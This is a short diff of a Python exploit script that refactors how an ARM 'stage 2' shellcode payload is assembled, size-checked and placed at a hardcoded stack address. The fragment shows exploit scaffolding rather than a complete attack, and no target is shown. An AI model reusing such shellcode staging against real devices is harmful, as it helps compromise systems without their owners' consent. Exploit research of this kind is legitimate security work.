@@ -7,12 +7,19 @@ def p(x):
 def pb(x):
   return pack(">I", x)
 
-def build_shellcode():
+STAGE2_SIZE = 0x300
+
+def get_shellcode():
   # assemble stage 2
   call(["arm-none-eabi-gcc", "-x", "assembler-with-cpp", "-nostartfiles",
         "-nostdlib", "-o", "stage2.bin", "stage2.s"])
   # generate raw instruction bytes
   call(["arm-none-eabi-objcopy", "-O", "binary", "stage2.bin"])
+  # read in the shellcode
+  with open('stage2.bin', 'rb') as f:
+    payload = f.read()
+    assert len(payload) == STAGE2_SIZE
+    return payload
 
 """
 u32 i don't know
@@ -141,15 +148,7 @@ arm-none-eabi-gcc -x assembler-with-cpp -nostartfiles -nostdlib -o stage2.o stag
 arm-none-eabi-objcopy -O binary stage2.o
 """
 
-build_shellcode()
-
-# sets some regs then null derefs off of r3, see temp.S
-with open('stage2.bin', 'rb') as f:
-  payload = f.read()
-
-STAGE2_SIZE = 0x300
-assert len(payload) == STAGE2_SIZE
-
+payload = get_shellcode()
 payload_stack_addr = 0x15D630C8
 
 # avoid 0x2f6000
